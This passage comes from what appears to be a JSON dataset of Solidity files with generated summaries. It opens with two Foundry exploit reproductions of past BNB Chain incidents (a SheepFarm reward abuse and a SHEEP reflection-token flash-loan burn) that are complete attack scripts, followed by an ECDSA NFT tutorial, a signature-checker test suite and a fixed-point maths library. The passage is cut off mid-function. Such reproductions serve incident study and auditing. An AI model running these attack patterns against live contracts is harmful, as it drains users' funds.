        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/AnciliaInc/status/1592658104394473472\n// https://twitter.com/BlockSecTeam/status/1592734292727455744\n// @Tx\n// https://bscscan.com/tx/0x5735026e5de6d1968ab5baef0cc436cc0a3f4de4ab735335c5b1bd31fa60c582\n\ninterface SheepFram{\n    function register(address neighbor) external;\n    function addGems() payable external;\n    function upgradeVillage(uint256 framId) external;\n    function withdrawMoney(uint256 wool) external;\n    function sellVillage() external;\n}\n\ncontract ContractTest is DSTest{\n    SheepFram sheepFram = SheepFram(0x4726010da871f4b57b5031E3EA48Bde961F122aA);\n    address neighbor = 0x14598f3a9f3042097486DC58C65780Daf3e3acFB;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 23088156);\n    }\n\n    function testExploit() public payable{\n        for(uint8 i = 0; i < 200; i++){\n            sheepFram.register(neighbor);\n        }\n        sheepFram.addGems{value: 5 * 1e14}();\n        for(uint8 i = 0; i < 3; i++){\n            sheepFram.upgradeVillage(i);\n        }\n        sheepFram.sellVillage();\n        uint BalanceBefore = address(this).balance;\n        sheepFram.withdrawMoney(20_000);\n        uint BalanceAfter = address(this).balance;\n\n        emit log_named_decimal_uint(\n            \"Attacker BNB profit after exploit\",\n            (BalanceAfter - BalanceBefore),\n            18\n        );\n\n    }\n\n    receive() payable external{}\n}\n",
        "summary": "This Solidity code is a test contract using the DSTest framework. It imports an interface and a contract called CheatCodes, and defines a SheepFram interface and a SheepFram contract instance. In the `setUp()` function, it creates a new fork on the Binance Smart Chain (BSC) and in the `testExploit()` function, it performs an exploit on the SheepFram contract by registering multiple times, adding gems, upgrading villages, and selling the village. Then it calls the `withdrawMoney()` function to withdraw 20,000 units of Wool and logs the attacker's profit in BNB (Binance Coin). The code is annotated with links to tweets and transactions related to the contract.",
        "id": "66b4a7ac-e817-447e-8195-c0e94331ff84"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/BlockSecTeam/status/1623999717482045440\n// https://twitter.com/BlockSecTeam/status/1624077078852210691\n// @TX\n// https://bscscan.com/tx/0x61293c6dd5211a98f1a26c9f6821146e12fb5e20c850ad3ed2528195c8d4c98e\n// Related Events\n// https://github.com/SunWeb3Sec/DeFiHackLabs/#20230207---fdp---reflection-token\n// https://github.com/SunWeb3Sec/DeFiHackLabs/#20230126---tinu---reflection-token\n\ninterface RDeflationERC20 is IERC20 {\n    function burn(uint256 amount) external;\n}\n\ncontract ContractTest is Test {\n    RDeflationERC20 SHEEP = RDeflationERC20(0x0025B42bfc22CbbA6c02d23d4Ec2aBFcf6E014d4);\n    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0x912DCfBf1105504fB4FF8ce351BEb4d929cE9c24);\n    address dodo = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 25_543_755);\n    }\n\n    function testExploit() public {\n        DVM(dodo).flashLoan(380 * 1e18, 0, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\"Attacker WBNB balance after exploit\", WBNB.balanceOf(address(this)), 18);\n    }\n\n    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        WBNBToSHEEP();\n        while (SHEEP.balanceOf(address(Pair)) > 2) {\n            uint256 burnAmount = SHEEP.balanceOf(address(this));\n            SHEEP.burn(burnAmount);\n        }\n        Pair.sync();\n        SHEEPToWBNB();\n        WBNB.transfer(dodo, 380 * 1e18);\n    }\n\n    function WBNBToSHEEP() internal {\n        WBNB.approve(address(Router), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(WBNB);\n        path[1] = address(SHEEP);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp\n        );\n    }\n\n    function SHEEPToWBNB() internal {\n        SHEEP.approve(address(Router), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(SHEEP);\n        path[1] = address(WBNB);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            SHEEP.balanceOf(address(this)), 0, path, address(this), block.timestamp\n        );\n    }\n}\n",
        "summary": "This is a Solidity contract that includes an interface for a deflationary ERC20 token (RDeflationERC20), as well as import statements for other token and contract interfaces. The contract includes a setup function and a \"testExploit\" function which leverages flash loans to manipulate the balances of two tokens (WBNB and SHEEP) in a decentralized exchange (UniSwap or similar) in order to siphon off profits.",
        "id": "cc7a9020-fe3b-4996-8df7-c4b9c43c648d"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\nimport \"../34_ERC721/ERC721.sol\";\n\n// ECDSA\u5e93\nlibrary ECDSA{\n    /**\n     * @dev \u901a\u8fc7ECDSA\uff0c\u9a8c\u8bc1\u7b7e\u540d\u5730\u5740\u662f\u5426\u6b63\u786e\uff0c\u5982\u679c\u6b63\u786e\u5219\u8fd4\u56detrue\n     * _msgHash\u4e3a\u6d88\u606f\u7684hash\n     * _signature\u4e3a\u7b7e\u540d\n     * _signer\u4e3a\u7b7e\u540d\u5730\u5740\n     */\n    function verify(bytes32 _msgHash, bytes memory _signature, address _signer) internal pure returns (bool) {\n        return recoverSigner(_msgHash, _signature) == _signer;\n    }\n\n    // @dev \u4ece_msgHash\u548c\u7b7e\u540d_signature\u4e2d\u6062\u590dsigner\u5730\u5740\n    function recoverSigner(bytes32 _msgHash, bytes memory _signature) internal pure returns (address){\n        // \u68c0\u67e5\u7b7e\u540d\u957f\u5ea6\uff0c65\u662f\u6807\u51c6r,s,v\u7b7e\u540d\u7684\u957f\u5ea6\n        require(_signature.length == 65, \"invalid signature length\");\n        bytes32 r;\n        bytes32 s;\n        uint8 v;\n        // \u76ee\u524d\u53ea\u80fd\u7528assembly (\u5185\u8054\u6c47\u7f16)\u6765\u4ece\u7b7e\u540d\u4e2d\u83b7\u5f97r,s,v\u7684\u503c\n        assembly {\n            /*\n            \u524d32 bytes\u5b58\u50a8\u7b7e\u540d\u7684\u957f\u5ea6 (\u52a8\u6001\u6570\u7ec4\u5b58\u50a8\u89c4\u5219)\n            add(sig, 32) = sig\u7684\u6307\u9488 + 32\n            \u7b49\u6548\u4e3a\u7565\u8fc7signature\u7684\u524d32 bytes\n            mload(p) \u8f7d\u5165\u4ece\u5185\u5b58\u5730\u5740p\u8d77\u59cb\u7684\u63a5\u4e0b\u676532 bytes\u6570\u636e\n            */\n            // \u8bfb\u53d6\u957f\u5ea6\u6570\u636e\u540e\u768432 bytes\n            r := mload(add(_signature, 0x20))\n            // \u8bfb\u53d6\u4e4b\u540e\u768432 bytes\n            s := mload(add(_signature, 0x40))\n            // \u8bfb\u53d6\u6700\u540e\u4e00\u4e2abyte\n            v := byte(0, mload(add(_signature, 0x60)))\n        }\n        // \u4f7f\u7528ecrecover(\u5168\u5c40\u51fd\u6570)\uff1a\u5229\u7528 msgHash \u548c r,s,v \u6062\u590d signer \u5730\u5740\n        return ecrecover(_msgHash, v, r, s);\n    }\n    \n    /**\n     * @dev \u8fd4\u56de \u4ee5\u592a\u574a\u7b7e\u540d\u6d88\u606f\n     * `hash`\uff1a\u6d88\u606f\u54c8\u5e0c \n     * \u9075\u4ece\u4ee5\u592a\u574a\u7b7e\u540d\u6807\u51c6\uff1ahttps://eth.wiki/json-rpc/API#eth_sign[`eth_sign`]\n     * \u4ee5\u53ca`EIP191`:https://eips.ethereum.org/EIPS/eip-191`\n     * \u6dfb\u52a0\"\\x19Ethereum Signed Message:\\n32\"\u5b57\u6bb5\uff0c\u9632\u6b62\u7b7e\u540d\u7684\u662f\u53ef\u6267\u884c\u4ea4\u6613\u3002\n     */\n    function toEthSignedMessageHash(bytes32 hash) public pure returns (bytes32) {\n        // 32 is the length in bytes of hash,\n        // enforced by the type signature above\n        return keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", hash));\n    }\n}\n\ncontract SignatureNFT is ERC721 {\n    address immutable public signer; // \u7b7e\u540d\u5730\u5740\n    mapping(address => bool) public mintedAddress;   // \u8bb0\u5f55\u5df2\u7ecfmint\u7684\u5730\u5740\n\n    // \u6784\u9020\u51fd\u6570\uff0c\u521d\u59cb\u5316NFT\u5408\u96c6\u7684\u540d\u79f0\u3001\u4ee3\u53f7\u3001\u7b7e\u540d\u5730\u5740\n    constructor(string memory _name, string memory _symbol, address _signer)\n    ERC721(_name, _symbol)\n    {\n        signer = _signer;\n    }\n\n    // \u5229\u7528ECDSA\u9a8c\u8bc1\u7b7e\u540d\u5e76mint\n    function mint(address _account, uint256 _tokenId, bytes memory _signature)\n    external\n    {\n        bytes32 _msgHash = getMessageHash(_account, _tokenId); // \u5c06_account\u548c_tokenId\u6253\u5305\u6d88\u606f\n        bytes32 _ethSignedMessageHash = ECDSA.toEthSignedMessageHash(_msgHash); // \u8ba1\u7b97\u4ee5\u592a\u574a\u7b7e\u540d\u6d88\u606f\n        require(verify(_ethSignedMessageHash, _signature), \"Invalid signature\"); // ECDSA\u68c0\u9a8c\u901a\u8fc7\n        require(!mintedAddress[_account], \"Already minted!\"); // \u5730\u5740\u6ca1\u6709mint\u8fc7\n                \n        mintedAddress[_account] = true; // \u8bb0\u5f55mint\u8fc7\u7684\u5730\u5740\n        _mint(_account, _tokenId); // mint\n    }\n\n    /*\n     * \u5c06mint\u5730\u5740\uff08address\u7c7b\u578b\uff09\u548ctokenId\uff08uint256\u7c7b\u578b\uff09\u62fc\u6210\u6d88\u606fmsgHash\n     * _account: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4\n     * _tokenId: 0\n     * \u5bf9\u5e94\u7684\u6d88\u606fmsgHash: 0x1bf2c0ce4546651a1a2feb457b39d891a6b83931cc2454434f39961345ac378c\n     */\n    function getMessageHash(address _account, uint256 _tokenId) public pure returns(bytes32){\n        return keccak256(abi.encodePacked(_account, _tokenId));\n    }\n\n    // ECDSA\u9a8c\u8bc1\uff0c\u8c03\u7528ECDSA\u5e93\u7684verify()\u51fd\u6570\n    function verify(bytes32 _msgHash, bytes memory _signature)\n    public view returns (bool)\n    {\n        return ECDSA.verify(_msgHash, _signature, signer);\n    }\n}\n\n\n/* Signature Verification\n\nHow to Sign and Verify\n# Signing\n1. Create message to sign\n2. Hash the message\n3. Sign the hash (off chain, keep your private key secret)\n\n# Verify\n1. Recreate hash from the original message\n2. Recover signer from signature and hash\n3. Compare recovered signer to claimed signer\n*/\n\n\n\ncontract VerifySignature {\n    /* 1. Unlock MetaMask account\n    ethereum.enable()\n    */\n\n    /* 2. Get message hash to sign\n    getMessageHash(\n        0x14723A09ACff6D2A60DcdF7aA4AFf308FDDC160C,\n        123,\n        \"coffee and donuts\",\n        1\n    )\n\n    hash = \"0xcf36ac4f97dc10d91fc2cbb20d718e94a8cbfe0f82eaedc6a4aa38946fb797cd\"\n    */\n    function getMessageHash(\n        address _addr,\n        uint256 _tokenId\n    ) public pure returns (bytes32) {\n        return keccak256(abi.encodePacked(_addr, _tokenId));\n    }\n\n    /* 3. Sign message hash\n    # using browser\n    account = \"copy paste account of signer here\"\n    ethereum.request({ method: \"personal_sign\", params: [account, hash]}).then(console.log)\n\n    # using web3\n    web3.personal.sign(hash, web3.eth.defaultAccount, console.log)\n\n    Signature will be different for different accounts\n    0x993dab3dd91f5c6dc28e17439be475478f5635c92a56e17e82349d3fb2f166196f466c0b4e0c146f285204f0dcb13e5ae67bc33f4b888ec32dfe0a063e8f3f781b\n    */\n    function getEthSignedMessageHash(bytes32 _messageHash)\n        public\n        pure\n        returns (bytes32)\n    {\n        /*\n        Signature is produced by signing a keccak256 hash with the following format:\n        \"\\x19Ethereum Signed Message\\n\" + len(msg) + msg\n        */\n        return\n            keccak256(\n                abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", _messageHash)\n            );\n    }\n\n    /* 4. Verify signature\n    signer = 0xB273216C05A8c0D4F0a4Dd0d7Bae1D2EfFE636dd\n    to = 0x14723A09ACff6D2A60DcdF7aA4AFf308FDDC160C\n    amount = 123\n    message = \"coffee and donuts\"\n    nonce = 1\n    signature =\n        0x993dab3dd91f5c6dc28e17439be475478f5635c92a56e17e82349d3fb2f166196f466c0b4e0c146f285204f0dcb13e5ae67bc33f4b888ec32dfe0a063e8f3f781b\n    */\n    function verify(\n        address _signer,\n        address _addr,\n        uint _tokenId,\n        bytes memory signature\n    ) public pure returns (bool) {\n        bytes32 messageHash = getMessageHash(_addr, _tokenId);\n        bytes32 ethSignedMessageHash = getEthSignedMessageHash(messageHash);\n\n        return recoverSigner(ethSignedMessageHash, signature) == _signer;\n    }\n\n    function recoverSigner(bytes32 _ethSignedMessageHash, bytes memory _signature)\n        public\n        pure\n        returns (address)\n    {\n        (bytes32 r, bytes32 s, uint8 v) = splitSignature(_signature);\n\n        return ecrecover(_ethSignedMessageHash, v, r, s);\n    }\n\n    function splitSignature(bytes memory sig)\n        public\n        pure\n        returns (\n            bytes32 r,\n            bytes32 s,\n            uint8 v\n        )\n    {\n        // \u68c0\u67e5\u7b7e\u540d\u957f\u5ea6\uff0c65\u662f\u6807\u51c6r,s,v\u7b7e\u540d\u7684\u957f\u5ea6\n        require(sig.length == 65, \"invalid signature length\");\n\n        assembly {\n            /*\n            First 32 bytes stores the length of the signature\n\n            add(sig, 32) = pointer of sig + 32\n            effectively, skips first 32 bytes of signature\n\n            mload(p) loads next 32 bytes starting at the memory address p into memory\n            */\n\n            // first 32 bytes, after the length prefix\n            r := mload(add(sig, 0x20))\n            // second 32 bytes\n            s := mload(add(sig, 0x40))\n            // final byte (first byte of the next 32 bytes)\n            v := byte(0, mload(add(sig, 0x60)))\n        }\n\n        // implicitly return (r, s, v)\n    }\n}\n",
        "summary": "This code provides a smart contract for minting NFTs that verifies the signature of the message sender using ECDSA before minting the NFT. The contract includes a library for ECDSA verification, which can be used by other contracts as well. The contract also includes a function for creating a message hash from an address and a token ID, and another function for creating the eth signed message hash from the message hash. Finally, the contract includes a function for verifying the signature given the signer's address, message sender's address and token ID, and the signature itself.",
        "id": "c59c6772-ec3b-4db9-b82f-6d02d9f0002e"
    },
    {
        "code": "// SPDX-License-Identifier: WTFPL\npragma solidity ^0.8.19;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {VyperDeployer} from \"utils/VyperDeployer.sol\";\n\nimport {ERC1271WalletMock} from \"./mocks/ERC1271WalletMock.sol\";\nimport {ERC1271MaliciousMock} from \"./mocks/ERC1271MaliciousMock.sol\";\n\nimport {ISignatureChecker} from \"./interfaces/ISignatureChecker.sol\";\n\ncontract SignatureCheckerTest is Test {\n    VyperDeployer private vyperDeployer = new VyperDeployer();\n    ERC1271WalletMock private wallet = new ERC1271WalletMock(makeAddr(\"alice\"));\n    ERC1271MaliciousMock private malicious = new ERC1271MaliciousMock();\n\n    ISignatureChecker private signatureChecker;\n\n    address private deployer = address(vyperDeployer);\n    address private walletAddr = address(wallet);\n    address private maliciousAddr = address(malicious);\n\n    function setUp() public {\n        signatureChecker = ISignatureChecker(\n            vyperDeployer.deployContract(\"src/utils/\", \"SignatureChecker\")\n        );\n    }\n\n    function testEOAWithValidSignature() public {\n        (address alice, uint256 key) = makeAddrAndKey(\"alice\");\n        bytes32 hash = keccak256(\"WAGMI\");\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, hash);\n        bytes memory signature = abi.encodePacked(r, s, v);\n        assertTrue(\n            signatureChecker.is_valid_signature_now(alice, hash, signature)\n        );\n        assertTrue(\n            !signatureChecker.is_valid_ERC1271_signature_now(\n                alice,\n                hash,\n                signature\n            )\n        );\n    }\n\n    function testEOAWithInvalidSigner() public {\n        (address alice, uint256 key) = makeAddrAndKey(\"alice\");\n        bytes32 hash = keccak256(\"WAGMI\");\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key + 1, hash);\n        bytes memory signature = abi.encodePacked(r, s, v);\n        assertTrue(\n            !signatureChecker.is_valid_signature_now(alice, hash, signature)\n        );\n        assertTrue(\n            !signatureChecker.is_valid_ERC1271_signature_now(\n                alice,\n                hash,\n                signature\n            )\n        );\n    }\n\n    function testEOAWithInvalidSignature1() public {\n        (address alice, uint256 key) = makeAddrAndKey(\"alice\");\n        bytes32 hash = keccak256(\"WAGMI\");\n        bytes32 hashWrong = keccak256(\"WAGMI1\");\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, hashWrong);\n        bytes memory signatureInvalid = abi.encodePacked(r, s, v);\n        assertTrue(\n            !signatureChecker.is_valid_signature_now(\n                alice,\n                hash,\n                signatureInvalid\n            )\n        );\n        assertTrue(\n            !signatureChecker.is_valid_ERC1271_signature_now(\n                alice,\n                hash,\n                signatureInvalid\n            )\n        );\n    }\n\n    function testEOAWithInvalidSignature2() public {\n        (address alice, uint256 key) = makeAddrAndKey(\"alice\");\n        bytes32 hash = keccak256(\"WAGMI\");\n        (, bytes32 r, bytes32 s) = vm.sign(key, hash);\n        bytes memory signatureInvalid = abi.encodePacked(r, s, bytes1(0xa0));\n        vm.expectRevert(bytes(\"ECDSA: invalid signature\"));\n        signatureChecker.is_valid_signature_now(alice, hash, signatureInvalid);\n        assertTrue(\n            !signatureChecker.is_valid_ERC1271_signature_now(\n                alice,\n                hash,\n                signatureInvalid\n            )\n        );\n    }\n\n    function testEOAWithTooHighSValue() public {\n        (address alice, uint256 key) = makeAddrAndKey(\"alice\");\n        bytes32 hash = keccak256(\"WAGMI\");\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, hash);\n        uint256 sTooHigh = uint256(s) +\n            0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0;\n        bytes memory signatureInvalid = abi.encodePacked(\n            r,\n            bytes32(sTooHigh),\n            v\n        );\n        vm.expectRevert(bytes(\"ECDSA: invalid signature 's' value\"));\n        signatureChecker.is_valid_signature_now(alice, hash, signatureInvalid);\n        assertTrue(\n            !signatureChecker.is_valid_ERC1271_signature_now(\n                alice,\n                hash,\n                signatureInvalid\n            )\n        );\n    }\n\n    function testEIP1271WithValidSignature() public {\n        (, uint256 key) = makeAddrAndKey(\"alice\");\n        bytes32 hash = keccak256(\"WAGMI\");\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, hash);\n        bytes memory signature = abi.encodePacked(r, s, v);\n        assertTrue(\n            signatureChecker.is_valid_signature_now(walletAddr, hash, signature)\n        );\n        assertTrue(\n            signatureChecker.is_valid_ERC1271_signature_now(\n                walletAddr,\n                hash,\n                signature\n            )\n        );\n    }\n\n    function testEIP1271WithInvalidSigner() public {\n        (, uint256 key) = makeAddrAndKey(\"alice\");\n        bytes32 hash = keccak256(\"WAGMI\");\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key + 1, hash);\n        bytes memory signature = abi.encodePacked(r, s, v);\n        assertTrue(\n            !signatureChecker.is_valid_signature_now(\n                walletAddr,\n                hash,\n                signature\n            )\n        );\n        assertTrue(\n            !signatureChecker.is_valid_ERC1271_signature_now(\n                walletAddr,\n                hash,\n                signature\n            )\n        );\n    }\n\n    function testEIP1271WithInvalidSignature1() public {\n        (, uint256 key) = makeAddrAndKey(\"alice\");\n        bytes32 hash = keccak256(\"WAGMI\");\n        bytes32 hashWrong = keccak256(\"WAGMI1\");\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, hashWrong);\n        bytes memory signatureInvalid = abi.encodePacked(r, s, v);\n        assertTrue(\n            !signatureChecker.is_valid_signature_now(\n                walletAddr,\n                hash,\n                signatureInvalid\n            )\n        );\n        assertTrue(\n            !signatureChecker.is_valid_ERC1271_signature_now(\n                walletAddr,\n                hash,\n                signatureInvalid\n            )\n        );\n    }\n\n    function testEIP1271WithInvalidSignature2() public {\n        (, uint256 key) = makeAddrAndKey(\"alice\");\n        bytes32 hash = keccak256(\"WAGMI\");\n        (, bytes32 r, bytes32 s) = vm.sign(key, hash);\n        bytes memory signatureInvalid = abi.encodePacked(r, s, bytes1(0xa0));\n        vm.expectRevert(bytes(\"ECDSA: invalid signature\"));\n        signatureChecker.is_valid_signature_now(\n            walletAddr,\n            hash,\n            signatureInvalid\n        );\n        assertTrue(\n            !signatureChecker.is_valid_ERC1271_signature_now(\n                walletAddr,\n                hash,\n                signatureInvalid\n            )\n        );\n    }\n\n    function testEIP1271WithMaliciousWallet() public {\n        (, uint256 key) = makeAddrAndKey(\"alice\");\n        bytes32 hash = keccak256(\"WAGMI\");\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, hash);\n        bytes memory signature = abi.encodePacked(r, s, v);\n        assertTrue(\n            !signatureChecker.is_valid_signature_now(\n                maliciousAddr,\n                hash,\n                signature\n            )\n        );\n        assertTrue(\n            !signatureChecker.is_valid_ERC1271_signature_now(\n                maliciousAddr,\n                hash,\n                signature\n            )\n        );\n    }\n\n    function testEIP1271NoIsValidSignatureFunction() public {\n        (, uint256 key) = makeAddrAndKey(\"alice\");\n        bytes32 hash = keccak256(\"WAGMI\");\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, hash);\n        bytes memory signature = abi.encodePacked(r, s, v);\n        assertTrue(\n            !signatureChecker.is_valid_signature_now(deployer, hash, signature)\n        );\n        assertTrue(\n            !signatureChecker.is_valid_ERC1271_signature_now(\n                deployer,\n                hash,\n                signature\n            )\n        );\n    }\n\n    function testFuzzEOAWithValidSignature(\n        string calldata signer,\n        string calldata message\n    ) public {\n        (address alice, uint256 key) = makeAddrAndKey(signer);\n        bytes32 hash = keccak256(abi.encode(message));\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, hash);\n        bytes memory signature = abi.encodePacked(r, s, v);\n        assertTrue(\n            signatureChecker.is_valid_signature_now(alice, hash, signature)\n        );\n        assertTrue(\n            !signatureChecker.is_valid_ERC1271_signature_now(\n                alice,\n                hash,\n                signature\n            )\n        );\n    }\n\n    function testFuzzEOAWithInvalidSigner(\n        string calldata signer,\n        string calldata message\n    ) public {\n        (address alice, uint256 key) = makeAddrAndKey(signer);\n        bytes32 hash = keccak256(abi.encode(message));\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key + 1, hash);\n        bytes memory signature = abi.encodePacked(r, s, v);\n        assertTrue(\n            !signatureChecker.is_valid_signature_now(alice, hash, signature)\n        );\n        assertTrue(\n            !signatureChecker.is_valid_ERC1271_signature_now(\n                alice,\n                hash,\n                signature\n            )\n        );\n    }\n\n    function testFuzzEOAWithInvalidSignature(\n        bytes calldata signature,\n        string calldata message\n    ) public {\n        vm.assume(signature.length < 64);\n        address alice = makeAddr(\"alice\");\n        bytes32 hash = keccak256(abi.encode(message));\n        assertTrue(\n            !signatureChecker.is_valid_signature_now(alice, hash, signature)\n        );\n        assertTrue(\n            !signatureChecker.is_valid_ERC1271_signature_now(\n                alice,\n                hash,\n                signature\n            )\n        );\n    }\n\n    function testFuzzEIP1271WithValidSignature(string calldata message) public {\n        (, uint256 key) = makeAddrAndKey(\"alice\");\n        bytes32 hash = keccak256(abi.encode(message));\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, hash);\n        bytes memory signature = abi.encodePacked(r, s, v);\n        assertTrue(\n            signatureChecker.is_valid_signature_now(walletAddr, hash, signature)\n        );\n        assertTrue(\n            signatureChecker.is_valid_ERC1271_signature_now(\n                walletAddr,\n                hash,\n                signature\n            )\n        );\n    }\n\n    function testFuzzEIP1271WithInvalidSigner(\n        string calldata signer,\n        string calldata message\n    ) public {\n        vm.assume(\n            keccak256(abi.encode(signer)) != keccak256(abi.encode(\"alice\"))\n        );\n        (, uint256 key) = makeAddrAndKey(signer);\n        bytes32 hash = keccak256(abi.encode(message));\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, hash);\n        bytes memory signature = abi.encodePacked(r, s, v);\n        assertTrue(\n            !signatureChecker.is_valid_signature_now(\n                walletAddr,\n                hash,\n                signature\n            )\n        );\n        assertTrue(\n            !signatureChecker.is_valid_ERC1271_signature_now(\n                walletAddr,\n                hash,\n                signature\n            )\n        );\n    }\n\n    function testEIP1271WithInvalidSignature(\n        bytes calldata signature,\n        string calldata message\n    ) public {\n        vm.assume(signature.length < 64);\n        bytes32 hash = keccak256(abi.encode(message));\n        assertTrue(\n            !signatureChecker.is_valid_signature_now(\n                walletAddr,\n                hash,\n                signature\n            )\n        );\n        assertTrue(\n            !signatureChecker.is_valid_ERC1271_signature_now(\n                walletAddr,\n                hash,\n                signature\n            )\n        );\n    }\n}\n",
        "summary": "This is a Solidity smart contract that tests the functionality of a signature checker. It imports various mock contracts and an interface for the signature checker. The contract tests different scenarios with valid and invalid signatures, and checks if the proposed signature checker contract returns expected results. Overall, the contract is a test suite designed to ensure that the signature checker contract works as intended.",
        "id": "40edca80-816b-48f2-8660-b0125464ba07"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity >=0.8.0;\n\n/// @notice Signed 18 decimal fixed point (wad) arithmetic library.\n/// @author Solmate (https://github.com/transmissions11/solmate/blob/main/src/utils/SignedWadMath.sol)\n/// @author Modified from Remco Bloemen (https://xn--2-umb.com/22/exp-ln/index.html)\n\n/// @dev Will not revert on overflow, only use where overflow is not possible.\nfunction toWadUnsafe(uint256 x) pure returns (int256 r) {\n    /// @solidity memory-safe-assembly\n    assembly {\n        // Multiply x by 1e18.\n        r := mul(x, 1000000000000000000)\n    }\n}\n\n/// @dev Takes an integer amount of seconds and converts it to a wad amount of days.\n/// @dev Will not revert on overflow, only use where overflow is not possible.\n/// @dev Not meant for negative second amounts, it assumes x is positive.\nfunction toDaysWadUnsafe(uint256 x) pure returns (int256 r) {\n    /// @solidity memory-safe-assembly\n    assembly {\n        // Multiply x by 1e18 and then divide it by 86400.\n        r := div(mul(x, 1000000000000000000), 86400)\n    }\n}\n\n/// @dev Takes a wad amount of days and converts it to an integer amount of seconds.\n/// @dev Will not revert on overflow, only use where overflow is not possible.\n/// @dev Not meant for negative day amounts, it assumes x is positive.\nfunction fromDaysWadUnsafe(int256 x) pure returns (uint256 r) {\n    /// @solidity memory-safe-assembly\n    assembly {\n        // Multiply x by 86400 and then divide it by 1e18.\n        r := div(mul(x, 86400), 1000000000000000000)\n    }\n}\n\n/// @dev Will not revert on overflow, only use where overflow is not possible.\nfunction unsafeWadMul(int256 x, int256 y) pure returns (int256 r) {\n    /// @solidity memory-safe-assembly\n    assembly {\n        // Multiply x by y and divide by 1e18.\n        r := sdiv(mul(x, y), 1000000000000000000)\n    }\n}\n\n/// @dev Will return 0 instead of reverting if y is zero and will\n/// not revert on overflow, only use where overflow is not possible.\nfunction unsafeWadDiv(int256 x, int256 y) pure returns (int256 r) {\n    /// @solidity memory-safe-assembly\n    assembly {\n        // Multiply x by 1e18 and divide it by y.\n        r := sdiv(mul(x, 1000000000000000000), y)\n    }\n}\n\nfunction wadMul(int256 x, int256 y) pure returns (int256 r) {\n    /// @solidity memory-safe-assembly\n    assembly {\n        // Store x * y in r for now.\n        r := mul(x, y)\n\n        // Equivalent to require(x == 0 || (x * y) / x == y)\n        if iszero(or(iszero(x), eq(sdiv(r, x), y))) {\n            revert(0, 0)\n        }\n\n        // Scale the result down by 1e18.\n        r := sdiv(r, 1000000000000000000)\n    }\n}\n\nfunction wadDiv(int256 x, int256 y) pure returns (int256 r) {\n    /// @solidity memory-safe-assembly\n    assembly {\n        // Store x * 1e18 in r for now.\n        r := mul(x, 1000000000000000000)\n\n        // Equivalent to require(y != 0 && ((x * 1e18) / 1e18 == x))\n        if iszero(and(iszero(iszero(y)), eq(sdiv(r, 1000000000000000000), x))) {\n            revert(0, 0)\n        }\n\n        // Divide r by y.\n        r := sdiv(r, y)\n    }\n}\n\n/// @dev Will not work with negative bases, only use when x is positive.\nfunction wadPow(int256 x, int256 y) pure returns (int256) {\n    // Equivalent to x to the power of y because x ** y = (e ** ln(x)) ** y = e ** (ln(x) * y)\n    return wadExp((wadLn(x) * y) / 1e18); // Using ln(x) means x must be greater than 0.\n}\n\nfunction wadExp(int256 x) pure returns (int256 r) {\n    unchecked {\n        // When the result is < 0.5 we return zero. This happens when\n        // x <= floor(log(0.5e18) * 1e18) ~ -42e18\n        if (x <= -42139678854452767551) return 0;\n\n        // When the result is > (2**255 - 1) / 1e18 we can not represent it as an\n        // int. This happens when x >= floor(log((2**255 - 1) / 1e18) * 1e18) ~ 135.\n        if (x >= 135305999368893231589) revert(\"EXP_OVERFLOW\");\n\n        // x is now in the range (-42, 136) * 1e18. Convert to (-42, 136) * 2**96\n        // for more intermediate precision and a binary basis. This base conversion\n        // is a multiplication by 1e18 / 2**96 = 5**18 / 2**78.\n        x = (x << 78) / 5**18;\n\n        // Reduce range of x to (-\u00bd ln 2, \u00bd ln 2) * 2**96 by factoring out powers\n        // of two such that exp(x) = exp(x') * 2**k, where k is an integer.\n        // Solving this gives k = round(x / log(2)) and x' = x - k * log(2).\n        int256 k = ((x << 96) / 54916777467707473351141471128 + 2**95) >> 96;\n        x = x - k * 54916777467707473351141471128;\n\n        // k is in the range [-61, 195].\n\n        // Evaluate using a (6, 7)-term rational approximation.\n        // p is made monic, we'll multiply by a scale factor later.\n        int256 